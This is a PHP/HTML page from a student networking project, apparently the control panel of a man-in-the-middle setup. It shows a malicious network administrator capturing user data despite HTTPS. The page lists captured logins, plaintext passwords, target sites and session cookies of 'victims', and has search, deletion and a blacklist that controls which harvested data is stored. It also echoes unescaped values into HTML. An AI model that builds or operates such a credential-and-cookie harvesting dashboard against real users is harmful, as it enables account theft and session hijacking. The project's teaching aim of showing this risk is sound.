<?php 
	require_once("fonctionBDD.php");
	$conn1=connexionBDD();

 ?>
<!DOCTYPE html>
<html>
<head>
	<title>Projet</title>
	<meta charset="utf-8">
	<link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>

	<script type="text/javascript" src="script.js"></script>
	
	<nav>
		<ul>	
			<a href=".?action=dash"><li>Dashboard</li></a>
			<a href=".?action=account"><li>Comptes</li></a>
			<a href=".?action=search"><li>Recherche</li></a>
			<a href=".?action=blackedlist"><li>Blacklist</li></a>
		</ul>
	</nav>
	<section>
		
<div id="dash" <?php if ($_GET['action'] == 'dash' or !isset($_GET['action'])){echo ' style="display:block" ';} ?>>
	<h1>Projet  Informatique Raphaël letourneur </h1>
	<p>Ce site a été réalisé dans le cadre d'un projet de première année en DUT R&T (Réseau et Télécommunication) à l'IUT
	d'Annecy. 	<br>
	Il a pour but de montrer comment un administrateur réseau malveillant peut récupérer les informations confidentielles des utilisateurs de son réseau malgrés les sécurités mise en place tel que le HTTPS </p>

	<div id="nbCompte">
		<p>Nombre de comptes :</p> 
		<?php 
			$nbss=nb($conn1,'comptes');
	        $nbs = $nbss->fetchAll();
		    foreach ($nbs as $ligne){ echo "<strong>" .$ligne["count"]."</strong>";	}
 		?>
	</div>
	<div id="nbSite">
		<p>Nombre de site : </p>
		<?php 
			$nbss=nb($conn1,'sites');
	        $nbs = $nbss->fetchAll();
		    foreach ($nbs as $ligne){ echo "<strong>" .$ligne["count"]."</strong>";	}
 		?>
	</div>
	<div id="nbAttack">
		<p>	Nombre d'attaque(s) :</p>
		<?php 
			$nbss=nb($conn1,'attaques');
	        $nbs = $nbss->fetchAll();
		    foreach ($nbs as $ligne){ echo "<strong>" .$ligne["count"]."</strong>";	}
 		?>
	</div>

</div>




<div id="listChercher" <?php if ($_GET['action'] == 'search'){echo ' style="display:block" ';} ?>>
	<h2>Recherche :</h2> 

	<form method="get">
   <input type="text" name="cherche" id="barre">
   <br>


	<div id="menuListDer">
		
	   	site : 
	   	
	   	<select id="selectSite" name="selectSite">
	    	<option value="">Choisissez un site ! </option>
	   	<?php 
	   		$s = ListerSite($conn1,'false');
	   		$site = $s->fetchAll();
			
	    		foreach ($site as $ligne){
	    			echo '<option name="'.$ligne["idsite"].'" value="'.$ligne["nom"].'">'.$ligne["nom"].'</option>';
				}
	   	 ?>
		</select>
	   
	   	login : 
		<select id="selectLogin" name="selectLogin">
	    		<option value="">Choisissez un login ! </option>
	    		<?php 
	    			$u = ListerUsername($conn1);
	    			$username = $u->fetchAll();
	    			foreach ($username as $ligne){
	    				echo '<option name="'.$ligne["username"].'" value="'.$ligne["username"].'">'.$ligne["username"].'</option>';
				}
	    		 ?>
		</select>
	   	password : 
		<select id="selectPassword" name="selectPassword">
	    		<option value="">Choisissez un mot de passe ! </option>
	    		<?php 
	    			$p = ListerPassword($conn1);
	    			$password = $p->fetchAll();
	    			foreach ($password as $ligne){
	    				echo '<option name="'.$ligne["pass"].'" value="'.$ligne["pass"].'">'.$ligne["pass"].'</option>';
				}
	    		 ?>
		</select>
	</div>	
	
   <input type="hidden" value="account" name="action" />
   <input type="submit" value="Rechercher" id="send" />
</form>

</div>


<div id="list" <?php if ($_GET['action'] == 'account'){echo ' style="display:block" ';} ?>>
	


	<h2>Listes des derniers comptes récupérer : </h2> 
	<ul>	
	    <li>
		<input type="checkbox" name="afficheur" value="login" id="login" onclick="aff('login')" >
		<label for="login">Login</label>
		</li>
		<li>
	   	<input type="checkbox" name="afficheur" value="password" id="password" onclick="aff('password')">
		<label for="password">Password</label>
		</li>
	    <li>
	   		<input type="checkbox" name="afficheur" value="site" id="site" onclick="aff('site')">
			<label for="site">Site</label>
		</li>
		<li>
	   		<input type="checkbox" name="afficheur" value="cookie" id="cookie" onclick="aff('cookie')">
			<label for="cookie">Cookie</label>
		</li>

	</ul>
	<br>

	<table id="tableCompte">

		<tr>
			<th class="login">Login</th>
			<th class="password">Password</th>
			<th class="site">Site</th>
			<th class="cookie">Cookie</th>
		</tr>

		<?php 
			if(isset($_GET['delAccount'])){
				supprCompte($conn1,$_GET['delAccount']);
			}


			if(isset($_GET['selectSite'])){

				if ($_GET['selectSite']!="") {
					$siteCherche = $_GET['selectSite'];
				}
				else{	$siteCherche="none";	}

				if ($_GET['selectLogin']!="") {
					$loginCherche = $_GET['selectLogin'];
				}
				else{	$loginCherche="none";	}

				if ($_GET['selectPassword']!="") {
					$passwordCherche = $_GET['selectPassword'];
				}
				else{	$passwordCherche="none";	}

				if ($_GET['cherche']!="") {
					$reCherche = $_GET['cherche'];
				}
				else{	$reCherche="none";	}
				
				$v = critereVictime($conn1,$siteCherche,$loginCherche,$passwordCherche,$reCherche);
				$victime = $v->fetchAll();
			}
			
			else{
				$v = ListerVictime($conn1);
				$victime = $v->fetchAll();
			}
			foreach ($victime as $ligne){
				echo '<tr>';
					echo '<td class="login">'.$ligne["username"].'</td>';
					echo '<td class="password">'.$ligne["pass"].'</td>';
					echo '<td class="site">'.$ligne["nom"].'</td>';
					if ($ligne["cookie"] != ""){
						echo '<td class="cookie"> <input id="cookie'.$ligne["idcompte"].'" class="cookieTXT" type="text" value="'.$ligne["cookie"].'"> </td>' ;
					}
					else{echo '<td class="cookie"> Pas de cookie </td>';}
					echo '<td> ';	

						echo '<a onclick="return confirm(\'Êtes-vous sûr de vouloir supprimer ce compte ? \');" href=".?action=account&delAccount='.$ligne["idcompte"].'">';
							echo '<img class="logo" src="img/croixRed.png">';
						echo '</a>';
					echo '</td>';
					echo '<td> ';	
						echo '<a href="http://'.$ligne["nom"].'">';
							echo '<img class="logo" src="img/www.png">';
						echo '</a>';
					echo '</td>';

				echo '</tr>';
			}
		 ?>
	</table>
</div>

<div id="blackedlist" <?php if ($_GET['action'] == 'blackedlist'){echo ' style="display:block" ';} ?>>
	<h2>BlackList : </h2>
	<p>
		Cette page corresond à la Blacklist. Les sites internet en vert sont ceux appartenant à la base de données qui sont normal (whitelister). Si quelqu'un se connecte à un de ses sites ou du moins un site qui n'est pas en orange, les données récupérer seront traité et stocker. <br> <br>

		Par contre, les sites en orange sont les exceptions, si vous choisissez de blacklister un site, alors les données recueillit dessus ne seront plus transmis à la base de données et donc perdu. <br> <br>

		Si vous blacklister un site alors que des comptes ont déjà été récupérer, ils sont stocker dans la base de données mais plus dispobible dans la liste ou lors de recherche. <br> <br>

		Vous pouvez également choisir de blacklister un site en l'ajoutant manuellement afin d'éviter que les futurs attaquents le concerne.
	</p>
	<table>

		<tr>
			<th>URL</th>
			<th>Changer</th>     
		</tr>
				
		<?php

			if(isset($_POST["siteBlack"])){
				changeEtatBlacklist($conn1,$_POST["siteBlack"],'true');
			}
			if(isset($_POST["siteWhite"])){
				changeEtatBlacklist($conn1,$_POST["siteWhite"],'false');
			}
			if(isset($_POST["blacklister"])){
				ajoutSiteBlacklist($conn1,$_POST["blacklister"]);	
			}
			if(isset($_GET["suppSite"])){
				supprSite($conn1,$_GET["suppSite"]);
			}
			

			$sb = ListerSite($conn1,'all');
			$siteBlack = $sb->fetchAll();
			foreach ($siteBlack as $ligne){
				if($ligne["blacked"]){
					echo '<form method="post">';
						echo '<tr style="background:red;">';
							echo '<td>'.$ligne["nom"].'</td>';
							echo '<td>';
								echo '<input type="hidden" value="'.$ligne["idsite"].'" name="siteWhite"/>';	
								echo '<input type="hidden" value="blackedlist" name="action"/>';	
								echo '<input type="submit" value="Whitelister" /> ';
					
							echo '</td>';
							echo '<td> <a href=".?action=blackedlist&suppSite='.$ligne["idsite"].'" onclick="return confirm(\'Êtes-vous sûr de vouloir supprimer ce site ? Cette action aura pour conséquence de supprimer tout les comptes associer à ce site !\');"><img class="logo" src="img/croixRed.png"></a>'; 
								echo '<a href="http://'.$ligne["nom"].'">';
									echo '<img class="logo" src="img/www.png">';
								echo '</a>';
							echo '</td>';
							
						echo '</tr>';	
					echo '</form>';
				}
				
				else{
				
					echo '<form method="post">';
						echo '<tr style="background:#00ad18;">';
							echo '<td>'.$ligne["nom"].'</td>';
							echo '<td>';
								echo '<input type="hidden" value="'.$ligne["idsite"].'" name="siteBlack"/>';	
								echo '<input type="hidden" value="blackedlist" name="action"/>';	
								echo '<input type="submit" value="Blacklister" /> ';
							echo '</td>';
							echo '<td> <a href=".?action=blackedlist&suppSite='.$ligne["idsite"].'" onclick="return confirm(\'Êtes-vous sûr de vouloir supprimer ce site ? Cette action aura pour conséquence de supprimer tout les comptes associer à ce site !\');"><img class="logo" src="img/croixRed.png"></a> ';
								echo '<a href="http://'.$ligne["nom"].'">';
									echo '<img class="logo" src="img/www.png">';
								echo '</a>';
							echo '</td>';
						echo '</tr>';	
					echo '</form>';
				}
			}

		 ?>

		<tr>
			
			<form method="post">
				<td><input type="text" name="blacklister"></td>
				<td><input href=".?action=blackedlist" type="submit" value="Ajouter"></td>
			</form>
		</tr>

		
	</table>
</div>

	</section>



</body>
</html>
<?php 
	deconnexionBDD($conn1);
 ?>
